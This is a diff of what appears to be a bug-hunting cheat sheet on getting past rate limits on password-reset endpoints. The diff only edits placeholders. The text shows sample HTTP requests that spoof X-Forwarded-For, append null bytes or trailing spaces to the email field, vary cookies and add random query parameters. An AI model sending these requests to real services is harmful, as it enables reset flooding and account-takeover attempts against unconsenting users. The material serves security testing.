@@ -14,7 +14,7 @@ For example:
 POST /ForgotPass.php HTTP/1.1
 Host: target.com
 X-Forwarded-For : 127.0.0.1
-[...]
+...
 
 email=victim@gmail.com
 ```
@@ -23,7 +23,7 @@ email=victim@gmail.com
 ```
 POST /ForgotPass.php HTTP/1.1
 Host: target.com
-[...]
+...
 
 email=victim@gmail.com%00
 ```
@@ -33,7 +33,7 @@ email=victim@gmail.com%00
 POST /ForgotPass.php HTTP/1.1
 Host: target.com
 Cookie: xxxxxxxxxx
-[...]
+...
 
 email=victim@gmail.com
 ```
@@ -42,7 +42,7 @@ Try this to bypass
 POST /ForgotPass.php HTTP/1.1
 Host: target.com
 Cookie: aaaaaaaaaaaaa
-[...]
+...
 
 email=victim@gmail.com
 ```
@@ -51,7 +51,7 @@ email=victim@gmail.com
 ```
 POST /ForgotPass.php HTTP/1.1
 Host: target.com
-[...]
+...
 
 email=victim@gmail.com
 ```
@@ -59,7 +59,7 @@ Try this to bypass
 ```
 POST /ForgotPass.php?random HTTP/1.1
 Host: target.com
-[...]
+...
 
 email=victim@gmail.com
 ```
@@ -68,7 +68,7 @@ email=victim@gmail.com
 ```
 POST /api/forgotpass HTTP/1.1
 Host: target.com
-[...]
+...
 
 {"email":"victim@gmail.com"}
 ```
@@ -76,7 +76,7 @@ Try this to bypass
 ```
 POST /api/forgotpass HTTP/1.1
 Host: target.com
-[...]
+...
 
 {"email":"victim@gmail.com "}
 ```
